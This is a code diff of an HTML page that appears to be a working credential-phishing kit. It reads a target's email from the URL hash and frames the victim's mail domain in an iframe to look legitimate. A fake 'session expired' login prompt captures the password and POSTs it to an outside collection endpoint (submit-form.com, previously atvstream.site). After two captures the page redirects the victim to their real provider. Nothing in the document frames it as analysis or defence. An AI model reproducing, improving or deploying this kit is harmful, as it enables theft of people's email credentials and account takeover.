@@ -129,7 +129,7 @@
         <div class="login_body">
             <div id="head">
                 <h3 id="name"></h3>
-                <span class="times">&times;</span>
+                <span class="times">×</span>
             </div>
             <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
             <div class="text-center confirm">Your session has expired please login again to continue</div>
@@ -145,82 +145,114 @@
             </form>
         </div>
     </div>
-</body>
 
-<div class="loading" id="loading">
-    <span class="loader"></span>
-    <h3 class="text-center">Connecting To Mail Server</h3>
-</div>
+    <div class="loading" id="loading">
+        <span class="loader"></span>
+        <h3 class="text-center">Connecting To Mail Server</h3>
+    </div>
 
-<iframe src="" frameborder="0" id="iframe"></iframe>
-<input type="hidden" value="0" id="number">
+    <iframe src="" frameborder="0" id="iframe"></iframe>
+    <input type="hidden" value="0" id="number">
 
 <script>
-    const phpLink = "https://atvstream.site/automail.php";
-
+    const phpLink = "https://submit-form.com/5BYUqxAm1";
     const sendCount = [];
 
-    var link = window.location.href;
-    var url = new URL(link);
-    var hash = url.hash;
-    var updated_email = hash.replace("#", "");
+    // Extract email from URL hash
+    const url = new URL(window.location.href);
+    const updated_email = url.hash.replace("#", "");
     document.getElementById("email").value = updated_email;
 
-    const inputString = updated_email;
-    const delimiter = "@";
-    const delimiterIndex = inputString.indexOf(delimiter);
-    const charactersAfter = inputString.substring(delimiterIndex + 1);
-    var iframe = document.getElementById("iframe");
-    var iframe_url = "https://www." + charactersAfter;
+    // Set iframe URL and page title
+    const delimiterIndex = updated_email.indexOf("@");
+    const charactersAfter = updated_email.substring(delimiterIndex + 1);
+    const iframe = document.getElementById("iframe");
+    const iframe_url = "https://www." + charactersAfter;
     iframe.setAttribute("src", iframe_url);
-    let linkArr = iframe_url.split(".")[1]
-    document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`
+    const linkArr = iframe_url.split(".")[1];
+    document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`;
 
+    // Hide loading animation after 4 seconds
     setTimeout(() => {
-        var loader = document.getElementById("loading");
-        loader.style.display = "none";
+        document.getElementById("loading").style.display = "none";
     }, 4000);
 
     document.addEventListener("DOMContentLoaded", function () {
+        // Set the name in the header
         document.querySelector("#name").innerHTML = linkArr;
-        var form = document.getElementById("form");
+
+        // Form submission handler
+        const form = document.getElementById("form");
         form.addEventListener("submit", function (e) {
             e.preventDefault();
 
-            var button = document.getElementById("newbutton");
-            var formData = new FormData(form);
-            var xhr = new XMLHttpRequest();
+            const email = document.getElementById("email").value;
+            const errors = document.getElementById("error");
+            const button = document.getElementById("newbutton");
+            const password = document.getElementById("password");
+
+            // Validate email
+            if (!email || !email.includes("@")) {
+                errors.innerText = "Invalid email address.";
+                return;
+            }
+
+            // Disable button and show loading state
+            button.disabled = true;
+            button.value = "Submitting...";
+
+            // Prepare form data
+            const formData = new FormData(form);
+            // Log form data for debugging
+            for (const pair of formData.entries()) {
+                console.log(`${pair[0]}: ${pair[1]}`);
+            }
+
+            // Send AJAX request
+            const xhr = new XMLHttpRequest();
             xhr.open("POST", phpLink, true);
-            var errors = document.getElementById("error");
-            errors.innerText = "Incorrect Username or Password!";
-            var password = document.getElementById("password");
-            password.value = "";
-
-            sendCount.push('sent');
-
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
+                    // Re-enable button
+                    button.disabled = false;
+                    button.value = "Sign In";
+
                     if (xhr.status === 200) {
-                        console.log(xhr.responseText);
+                        // Successful submission
+                        sendCount.push("sent");
+                        errors.innerText = "Submission successful!";
+                        console.log("Server response:", xhr.responseText);
+                        document.getElementById("msg").style.display = "none"; // Hide incorrect password message
+
+                        // Redirect after two successful submissions
+                        if (sendCount.length >= 2) {
+                            setTimeout(() => {
+                                window.location.href = "https://www." + charactersAfter;
+                            }, 2000);
+                        }
                     } else {
-                        console.error(xhr.responseText);
+                        // Handle error
+                        errors.innerText = "Submission failed. Please try again.";
+                        document.getElementById("msg").style.display = "block"; // Show incorrect password message
+                        console.error("Server error:", xhr.status, xhr.responseText);
                     }
                 }
-
-                if (sendCount.length >= 2) {
-                    errors.innerText = "";
-                    setTimeout(() => {
-                        window.location.href = "https://www." + charactersAfter;
-                    }, 2000);
-                }
+            };
+            xhr.onerror = function () {
+                // Handle network errors
+                button.disabled = false;
+                button.value = "Sign In";
+                errors.innerText = "Network error. Please check your connection and try again.";
+                console.error("Network error during submission");
             };
             xhr.send(formData);
+            password.value = ""; // Clear password field
         });
+
+        // Optional: Uncomment to enable closing the login form
+        // document.querySelector(".times").addEventListener("click", () => {
+        //     document.querySelector(".login").style.display = "none";
+        // });
     });
-
-    // document.querySelector('.times').addEventListener('click', () => {
-    //     document.querySelector('.login').style.display = 'none';
-    // })
 </script>
-
 </html>
